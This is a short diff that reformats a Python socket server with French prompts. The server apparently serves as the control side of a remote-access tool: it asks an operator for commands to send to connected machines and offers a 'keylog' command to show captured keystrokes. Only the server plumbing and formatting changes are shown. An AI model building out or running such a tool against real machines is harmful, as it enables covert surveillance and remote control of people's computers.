@@ -10,9 +10,7 @@ def handle_connection(connection, address):
 
     while True:
         try:
-            command = input(
-                "Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : "
-            )
+            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
@@ -56,7 +54,6 @@ def handle_connection(connection, address):
 
     connection.close()
 
-
 def start_server():
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ss.bind((ip_address, port_number))
@@ -67,7 +64,6 @@ def start_server():
         connection, address = ss.accept()
         thread = threading.Thread(target=handle_connection, args=(connection, address))
         thread.start()
-
 
 if __name__ == "__main__":
     start_server()
